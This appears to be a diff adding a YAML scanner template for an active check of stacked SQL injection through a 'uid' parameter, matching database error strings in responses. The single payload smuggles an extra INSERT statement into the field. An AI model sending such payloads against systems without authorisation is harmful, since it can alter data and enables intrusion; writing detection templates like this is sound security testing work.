@@ -1,0 +1,25 @@
+id: sqli2-stacked-10
+name: 'SQLi stacked via uid'
+severity: critical
+type: active
+tags:
+  - sqli
+  - injection
+  - stacked
+description: 'Extra SQL statement via uid'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      uid:
+        - '''; INSERT INTO t VALUES(1)--'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
+          - 'PostgreSQL'
+          - 'ODBC'
+          - 'ORA-'
+          - 'SQLite'
